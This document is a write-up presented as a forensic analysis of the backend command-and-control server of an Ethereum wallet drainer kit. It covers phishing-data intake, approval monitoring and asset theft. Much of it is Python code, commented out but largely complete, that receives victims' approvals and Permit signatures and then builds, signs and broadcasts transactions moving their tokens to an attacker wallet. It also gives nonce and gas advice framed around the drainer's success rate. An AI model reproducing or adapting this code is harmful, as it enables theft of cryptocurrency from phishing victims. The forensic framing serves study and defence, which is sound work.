# EVM Drainer Kit: Backend Server (C2) Code Flow Analysis

**Source Document:** Comprehensive EVM Drainer Forensic Report
**Date of Analysis:** May 12, 2025

## 1. Introduction

This document details the conceptual code execution flow of the **Backend Server (Command and Control - C2)** component of a typical EVM wallet drainer kit. This analysis is based solely on the findings and descriptions within the "Comprehensive EVM Drainer Forensic Report." The backend server is the brain of the operation, receiving data from the phishing frontend, managing victim information, interacting with the blockchain to execute draining transactions, and often coordinating automation scripts.

## 2. Core Objectives of the Backend Server Code

According to the forensic report, the backend server code (typically Python, Node.js, or Go) is designed to:

1.  **Receive Data from Frontend:** Accept data payloads (victim address, signed messages, approval transaction hashes, targeted assets) from the phishing frontend via API endpoints.
2.  **Victim and Session Management:** Store and manage information about victims, their connected wallets, and the status of various malicious operations against them.
3.  **Blockchain Interaction (Core Draining Logic):**
    *   Monitor the blockchain for confirmation of approval transactions submitted by victims.
    *   Use captured signatures (e.g., Permit, Seaport) to craft and submit transactions that transfer assets.
    *   Directly use confirmed approvals to execute `transferFrom` (for ERC20s) or `safeTransferFrom` (for NFTs) from the victim's wallet to an attacker-controlled address via a drainer smart contract or directly.
    *   Manage gas fees, nonces, and transaction retries for draining operations.
4.  **Asset Targeting Logic:** Potentially analyze victim asset information (balances, NFT holdings) to prioritize or select specific assets for draining.
5.  **Coordination with Automation Scripts:** Trigger or provide data to automation scripts for tasks like mempool monitoring or continuous draining attempts.
6.  **Security and Evasion:** Implement measures to protect the backend infrastructure and evade detection (e.g., IP rotation, obfuscated communication protocols, though these are more operational than pure code flow).

## 3. Conceptual Code Execution Flow (Python/Node.js-centric)

The forensic report suggests the backend operates as a web server with API endpoints and background workers/scripts for blockchain interaction.

### 3.1. API Endpoint: Receiving Data from Frontend (`api_handler.py`, `routes/victim.js`)

*   **Execution Step 1: Frontend POSTs Data to `/api/submit_data` (or similar).**
    *   **Logic:** A web framework (e.g., Flask/Django in Python, Express.js in Node.js) handles incoming HTTP requests.
    *   **Code Concept (Report Implication - Flask/Python):**
        ```python
        # Conceptual Flask snippet based on report's description
        # from flask import Flask, request, jsonify
        # app = Flask(__name__)

        # @app.route("/api/submit_data", methods=["POST"])
        # def handle_submission():
        #     data = request.get_json()
        #     victim_address = data.get("victimAddress")
        #     interaction_type = data.get("type") # e.g., "approval", "permit_signature", "seaport_order"
        #     payload = data.get("payload") # txHash for approval, signature for off-chain
        #     target_asset = data.get("assetDetails") # e.g., token address, NFT contract/ID

        #     # 1. Validate data (basic sanity checks)
        #     if not victim_address or not interaction_type or not payload:
        #         return jsonify({"status": "error", "message": "Missing data"}), 400

        #     # 2. Store victim data and interaction details in a database or cache
        #     # store_victim_interaction(victim_address, interaction_type, payload, target_asset)

        #     # 3. Based on interaction_type, trigger appropriate backend logic
        #     if interaction_type == "approval":
        #         # Add txHash to a monitoring list for an approval-watcher worker
        #         # add_to_approval_monitoring_queue(victim_address, payload.get("txHash"), target_asset)
        #         return jsonify({"status": "pending_approval", "message": "Approval transaction received, monitoring..."})
        #     elif interaction_type in ["permit_signature", "seaport_order"]:
        #         # Trigger immediate attempt to use the signature
        #         # result = process_offchain_signature(victim_address, payload.get("signature"), target_asset, interaction_type)
        #         # return jsonify(result)
        #     else:
        #         return jsonify({"status": "error", "message": "Invalid interaction type"}), 400
        ```
    *   **Functionality:** Parses incoming JSON data, validates it, stores relevant information (e.g., in a database like PostgreSQL/MongoDB or a Redis cache), and then queues the task for further processing (e.g., by a background worker or another service).
    *   **Data Flow:** Receives victim address, interaction type (approval, signature), transaction hash or signature data, and details of the targeted asset(s).
    *   **Report Reference:** The "Backend Server (C2)" section describes its role as the central data recipient.

### 3.2. Background Worker: Monitoring On-Chain Approvals (`approval_watcher.py`, `blockchain_monitor_service.js`)

*   **Execution Step 2: Worker Fetches Approval Task from Queue.**
    *   **Logic:** A separate process or thread pool (e.g., Celery in Python, BullMQ in Node.js, or a simple loop with sleep) continuously checks a queue for new approval transaction hashes to monitor.
    *   **Code Concept (Report Implication - Python with Web3.py):**
        ```python
        # Conceptual approval watcher snippet
        # from web3 import Web3
        # import time

        # w3 = Web3(Web3.HTTPProvider("YOUR_RPC_URL"))

        # def monitor_approval_transaction(tx_hash, victim_address, target_asset):
        #     print(f"Monitoring approval tx: {tx_hash} for victim: {victim_address}")
        #     try:
        #         receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300) # Wait up to 5 mins
        #         if receipt.status == 1:
        #             print(f"Approval successful for {tx_hash}!")
        #             # Trigger drain using this approval
        #             # trigger_drain_with_approval(victim_address, target_asset.get("tokenAddress"), DRAINER_CONTRACT_ADDRESS)
        #         else:
        #             print(f"Approval failed for {tx_hash} (tx status 0).")
        #             # Log failure, maybe notify frontend if a retry mechanism is in place
        #     except Exception as e: # Catches TimeoutError, etc.
        #         print(f"Error monitoring approval {tx_hash}: {e}")
        #         # Handle error, potentially requeue or mark as failed

        # # Main loop for worker (simplified)
        # # while True:
        # #     task = get_task_from_approval_queue() # e.g., pop from Redis list
        # #     if task:
        # #         monitor_approval_transaction(task.tx_hash, task.victim_address, task.target_asset)
        # #     time.sleep(5) # Poll queue every 5 seconds
        ```
    *   **Functionality:** Uses a Web3 library to check the status of a submitted approval transaction. If successful, it triggers the actual draining logic.
    *   **Data Flow:** Consumes `tx_hash`, `victim_address`, `target_asset` from the queue. Interacts with an Ethereum node via RPC.
    *   **Report Reference:** Implied by the need to act upon confirmed approvals.

### 3.3. Core Draining Logic: Using Approvals or Signatures (`drainer_core.py`, `asset_extractor_service.js`)

*   **Execution Step 3a (Post-Approval): Execute `transferFrom` or `safeTransferFrom`.**
    *   **Logic:** Called after an approval is confirmed.
    *   **Code Concept (Report Implication - Python with Web3.py, using a drainer contract):**
        ```python
        # Conceptual: Drain ERC20 using confirmed approval via a drainer contract
        # DRAINER_CONTRACT_ABI = "[...]" # ABI of the drainer contract with a function like drainToken(token, victim, amount)
        # drainer_contract = w3.eth.contract(address=DRAINER_CONTRACT_ADDRESS, abi=DRAINER_CONTRACT_ABI)
        # ATTACKER_WALLET_PRIVATE_KEY = "..."
        # attacker_account = w3.eth.account.from_key(ATTACKER_WALLET_PRIVATE_KEY)

        # def trigger_drain_with_approval(victim_address, token_address, approved_spender_is_drainer_contract=True):
        #     # Assume approval was granted to DRAINER_CONTRACT_ADDRESS
        #     # Fetch victim's balance of the token to drain the full amount
        #     # erc20_contract = w3.eth.contract(address=token_address, abi=ERC20_ABI_MINIMAL)
        #     # victim_balance = erc20_contract.functions.balanceOf(victim_address).call()
        #     # allowance = erc20_contract.functions.allowance(victim_address, DRAINER_CONTRACT_ADDRESS).call()
        #     # amount_to_drain = min(victim_balance, allowance)

        #     # if amount_to_drain > 0:
        #     #     try:
        #     #         nonce = w3.eth.get_transaction_count(attacker_account.address)
        #     #         tx_params = {
        #     #             "from": attacker_account.address,
        #     #             "gas": 200000, # Estimate appropriately
        #     #             "gasPrice": w3.eth.gas_price,
        #     #             "nonce": nonce,
        #     #         }
        #     #         # If drainer contract has a function like: drainToken(tokenAddress, victimAddress, amountToDrain)
        #     #         drain_tx = drainer_contract.functions.drainToken(token_address, victim_address, amount_to_drain).build_transaction(tx_params)
        #     #         signed_tx = w3.eth.account.sign_transaction(drain_tx, private_key=ATTACKER_WALLET_PRIVATE_KEY)
        #     #         sent_tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        #     #         print(f"Drain transaction sent: {sent_tx_hash.hex()} for token {token_address} from {victim_address}")
        #     #         # Monitor this drain_tx for confirmation
        #     #     except Exception as e:
        #     #         print(f"Error sending drain transaction for {token_address} from {victim_address}: {e}")
        ```
*   **Execution Step 3b (Off-Chain Signature): Use signature with `permit` or Seaport contract.**
    *   **Logic:** Called when a valid off-chain signature is received from the frontend.
    *   **Code Concept (Report Implication - Python with Web3.py for Permit):**
        ```python
        # Conceptual: Using a Permit signature to set allowance then drain
        # PERMIT_TOKEN_CONTRACT_ABI = "[...]" # ABI including the permit function
        # def process_permit_signature(victim_address, signature_data, token_address):
        #     # Deconstruct signature_data: owner, spender, value, deadline, v, r, s
        #     # owner = victim_address
        #     # spender = DRAINER_CONTRACT_ADDRESS or ATTACKER_WALLET_ADDRESS
        #     # ... extract other params from signature_data or frontend payload ...

        #     # token_contract_with_permit = w3.eth.contract(address=token_address, abi=PERMIT_TOKEN_CONTRACT_ABI)
        #     # try:
        #     #     nonce = w3.eth.get_transaction_count(attacker_account.address)
        #     #     permit_tx = token_contract_with_permit.functions.permit(
        #     #         owner, spender, value, deadline, v, r, s
        #     #     ).build_transaction({
        #     #         "from": attacker_account.address, "gas": 150000, "gasPrice": w3.eth.gas_price, "nonce": nonce
        #     #     })
        #     #     signed_permit_tx = w3.eth.account.sign_transaction(permit_tx, private_key=ATTACKER_WALLET_PRIVATE_KEY)
        #     #     sent_permit_tx_hash = w3.eth.send_raw_transaction(signed_permit_tx.rawTransaction)
        #     #     print(f"Permit transaction sent: {sent_permit_tx_hash.hex()}. Waiting for confirmation...")
        #     #     # Wait for permit tx confirmation, then trigger drain_with_approval (as spender is now approved)
        #     #     # w3.eth.wait_for_transaction_receipt(sent_permit_tx_hash)
        #     #     # trigger_drain_with_approval(victim_address, token_address)
        #     # except Exception as e:
        #     #     print(f"Error processing permit signature for {token_address} from {victim_address}: {e}")
        ```
    *   **Functionality:** Constructs and sends the actual transaction(s) that move assets from the victim's wallet. This involves careful nonce management, gas estimation, and signing transactions with an attacker-controlled private key.
    *   **Data Flow:** Uses victim address, asset details, approval/signature data. Interacts heavily with an Ethereum node. Sends transactions to the blockchain.
    *   **Report Reference:** Core logic described in "Backend Server," "Drainer Smart Contract(s)," and "Flow of Execution Timeline."

### 3.4. Nonce Management and Gas Strategy

*   **Logic:** The backend must reliably manage nonces for the attacker's transaction-sending wallet to ensure transactions are processed in order and not rejected. It also needs a strategy for gas prices (e.g., using `eth_gasPrice`, or a more advanced EIP-1559 strategy) to ensure timely execution without overpaying.
*   **Code Concept:** Involves `w3.eth.get_transaction_count(attacker_account.address)` before sending each transaction and careful incrementing, potentially with a locking mechanism if multiple workers/threads can send transactions from the same address.

## 4. Database/Cache Interaction

*   **Logic:** Throughout its operation, the backend frequently reads from and writes to a database or cache (e.g., Redis, PostgreSQL) to store victim profiles, session states, targeted assets, transaction statuses, and logs.
*   **Report Reference:** Implied by the need to manage state across different interactions and potentially over time.

## 5. Conclusion

The Backend Server (C2) is the operational core of the EVM wallet drainer. Its code execution flow is a combination of API handling for frontend communication, robust blockchain interaction for monitoring and executing drains, and state management. It translates the victim's compromised approvals or signatures into actual asset theft by carefully crafting, signing, and broadcasting transactions on the blockchain. The sophistication of its nonce management, gas strategy, and error handling directly impacts the drainer's success rate and efficiency.

